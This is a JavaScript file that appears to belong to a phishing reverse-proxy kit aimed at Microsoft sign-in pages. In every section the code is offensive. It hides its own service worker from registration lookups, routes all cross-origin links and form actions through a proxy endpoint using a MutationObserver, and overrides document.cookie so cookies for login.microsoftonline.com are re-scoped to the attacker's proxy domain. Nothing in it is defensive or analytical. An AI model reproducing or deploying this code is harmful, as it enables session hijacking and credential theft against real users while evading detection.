// ============================================================
// PATCHED SCRIPT – SW hiding + MutationObserver + Cookie Domain Rewriter
// ============================================================
console.log('[DOM SCRIPT] Patched version loaded');

// ---- 1. Hide Service Worker ----
(function () {
    const originalGetRegistration = navigator.serviceWorker.getRegistration;
    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalGetRegistration.apply(this, arguments)
            .then(registration => {
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalGetRegistrations = navigator.serviceWorker.getRegistrations;
    navigator.serviceWorker.getRegistrations = function () {
        return originalGetRegistrations.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {
                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                });
            });
    };
})();

// ---- 2. MutationObserver for href/action rewriting ----
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        } else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];
observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    } catch { }
}

// ---- 3. Cookie Domain Rewriter (fix for JavaScript-set cookies) ----
(function() {
    const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    const originalSet = originalDescriptor.set;
    const originalGet = originalDescriptor.get;
    const proxyDomain = window.__originalHostname;  // saved by the domain mask

    if (!proxyDomain) {
        console.warn('[Cookie Patch] __originalHostname not found; using location.hostname');
    }
    const effectiveDomain = proxyDomain || window.location.hostname;

    Object.defineProperty(document, 'cookie', {
        get: originalGet,
        set: function(value) {
            let newValue = value;
            // If the cookie is being set for login.microsoftonline.com, rewrite Domain
            if (value && value.includes('login.microsoftonline.com')) {
                // Replace Domain=.login.microsoftonline.com or Domain=login.microsoftonline.com
                newValue = value.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${effectiveDomain}`);
                // If no Domain attribute is present, add it (unlikely but safe)
                if (!/Domain\s*=/i.test(newValue)) {
                    newValue += `; Domain=${effectiveDomain}`;
                }
            }
            originalSet.call(document, newValue);
        },
        configurable: true
    });
    console.log('[Cookie Patch] Active – cookies for microsoftonline.com will be rewritten to domain:', effectiveDomain);
})();
